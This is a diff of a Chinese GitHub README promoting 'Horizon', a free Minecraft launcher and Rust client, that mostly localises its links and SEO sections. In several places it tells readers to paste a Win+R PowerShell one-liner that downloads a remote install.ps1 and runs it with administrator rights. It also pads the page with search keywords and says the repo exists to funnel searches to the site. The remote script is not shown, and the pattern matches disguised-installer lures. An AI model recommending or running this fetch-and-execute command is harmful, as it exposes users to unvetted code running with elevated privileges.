@@ -16,7 +16,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>普通安装 — 下载 Horizon setup.exe</strong></a>
-  · <a href="https://horizonlauncher.net/en/download-horizon/">下载 Horizon</a>
+  · <a href="https://horizonlauncher.net/zh/download-horizon/">下载 Horizon</a>
   · <a href="https://horizonlauncher.net/">horizonlauncher.net</a>
   · <a href="https://t.me/horizonlauncher">Telegram</a>
 </p>
@@ -46,13 +46,13 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <a href="https://horizonlauncher.net/"><strong>官网 horizonlauncher.net</strong></a> ·
-  <a href="https://horizonlauncher.net/en/minecraft-rust/">Rust 版 Minecraft</a> ·
-  <a href="https://horizonlauncher.net/en/faq/">常见问题</a> ·
+  <a href="https://horizonlauncher.net/zh/minecraft-rust/">Rust 版 Minecraft</a> ·
+  <a href="https://horizonlauncher.net/zh/faq/">常见问题</a> ·
   <a href="https://t.me/horizonlauncher">Telegram</a>
 </p>
 
 <p align="center">
-  <a href="https://horizonlauncher.net/en/download-horizon/"><img alt="Win+R" src="https://img.shields.io/badge/Win+R-install.ps1-1a120c?style=for-the-badge"></a>
+  <a href="https://horizonlauncher.net/zh/download-horizon/"><img alt="Win+R" src="https://img.shields.io/badge/Win+R-install.ps1-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><img alt="下载 Horizon" src="https://img.shields.io/badge/下载_Horizon-Windows安装包-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/"><img alt="horizonlauncher.net" src="https://img.shields.io/badge/Site-horizonlauncher.net-c45c26?style=for-the-badge"></a>
   <a href="https://t.me/horizonlauncher"><img alt="Telegram" src="https://img.shields.io/badge/Telegram-t.me/horizonlauncher-26A5E4?style=for-the-badge"></a>
@@ -71,7 +71,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center"><em>更新 2026-11-16：启动器 <strong>0.2.69</strong>，LGPL，Win+R，UAC。 <a href="https://horizonlauncher.net/zh/">horizonlauncher.net</a>.</em></p>
 
-[![Horizon Minecraft](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/zh/)
+[![下载 Horizon Minecraft Rust 版](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/zh/)
 
 
 ## Horizon 视频与 GIF
@@ -136,7 +136,7 @@ Horizon **不属于** Mojang / Microsoft。请只从 **horizonlauncher.net** 下
 7. [服务器、模组、FPS](#服务器模组fps)
 8. [常见问题](#常见问题)
 9. [网站页面链接](#网站页面链接)
-10. [English — Download Horizon Minecraft launcher](#english-download-horizon-minecraft-launcher)
+10. [English — 下载 Horizon Minecraft launcher](#english-下载-horizon-minecraft-launcher)
 11. [SEO 标签与搜索词](#seo-标签与搜索词)
 
 ---
@@ -180,10 +180,10 @@ Horizon 持续维护，补丁定期发布。每个版本单独成 GitHub Release
 
 | | |
 |---|---|
-| 下载 Horizon | [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) |
-| 安装启动器 | [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) |
+| 下载 Horizon | [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/) |
+| 安装启动器 | [https://horizonlauncher.net/zh/install-horizon/](https://horizonlauncher.net/zh/install-horizon/) |
 | Setup `.exe` | [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) |
-| Rust 版 Minecraft | [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) |
+| Rust 版 Minecraft | [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) |
 | 官网 horizonlauncher.net | [https://horizonlauncher.net](https://horizonlauncher.net) |
 
 **系统要求**
@@ -216,7 +216,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 安装程序和启动器以管理员身份 (UAC) 运行 — 请确认 Windows 提示。该命令只从 horizonlauncher.net 获取 `install.ps1`。
 
-完整教程： [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+完整教程： [https://horizonlauncher.net/zh/install-horizon/](https://horizonlauncher.net/zh/install-horizon/) · [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/)
 
 ### 方法 2. 普通安装（setup.exe）
 
@@ -266,7 +266,7 @@ Win+R：`irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launch
 - Windows 启动器，不必手装 JDK；
 - 磁盘上已有的任意游戏版本。
 
-了解更多: [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/)
+了解更多: [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) · [https://horizonlauncher.net/zh/performance/](https://horizonlauncher.net/zh/performance/)
 
 ## 启动器对比（官方 / JVM / Horizon）
 
@@ -313,24 +313,28 @@ Horizon 的 Rust 客户端不需要。
 [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 启动器 **0.2.69** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/)
 
 **Windows 7 / macOS / Linux？**  
-仅 **Windows 10/11 x64**。 [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+安装包仅支持 **Windows 10/11 x64**。详见 [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/)。
 
 **俄语站？**  
-[https://horizonlauncher.net/](https://horizonlauncher.net/)
+[https://horizonlauncher.net/](https://horizonlauncher.net/) — 主 README 为俄语。
 
-**为什么 GitHub？**  
-「Horizon launcher github」→ **[horizonlauncher.net](https://horizonlauncher.net/zh/)**
+**为什么还有 GitHub？**  
+让「Horizon launcher github」等搜索指向 canonical **[horizonlauncher.net](https://horizonlauncher.net/zh/)**。
 
 ## 网站页面链接
 
-**ZH:** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/) · [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/) · [https://horizonlauncher.net/zh/install-horizon/](https://horizonlauncher.net/zh/install-horizon/) · [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**简体中文:** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/) · [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/) · [https://horizonlauncher.net/zh/install-horizon/](https://horizonlauncher.net/zh/install-horizon/) · [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) · [https://horizonlauncher.net/gallery/](https://horizonlauncher.net/gallery/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
-**EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · **RU:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [sitemap](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
+**English:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+
+**俄语:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [https://horizonlauncher.net/download-horizon/](https://horizonlauncher.net/download-horizon/)
+
+[网站地图](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
 
 
-## English — Download Horizon Minecraft launcher
+## English — 下载 Horizon Minecraft launcher
 
-**Horizon** — free **Windows Minecraft launcher** and **Java client in Rust**. [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**.
+**Horizon** 是免费的 **Windows Minecraft 启动器** 与 **Rust 重写的 Java 客户端**（Minecraft Rust Edition）。英文 canonical 页面：[https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**。非 Mojang/Microsoft 官方产品。
 
 
 ## SEO 标签与搜索词
@@ -341,14 +345,14 @@ Horizon 的 Rust 客户端不需要。
 
 ### 下载 / Win+R / setup.exe
 
-- [https://horizonlauncher.net/](https://horizonlauncher.net/)
-- [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
-- Win+R: `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
-- [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
-- [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
-- [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
-- [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
-- [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
+- **网站:** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/) · [https://horizonlauncher.net/](https://horizonlauncher.net/)
+- **下载:** [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/)
+- **Win+R:** `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
+- **安装包:** [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+- **EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+- **Rust 版 Minecraft:** [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
+- **Telegram:** [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
+- **网站地图:** [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
 
 
 **下载：** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/) · [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
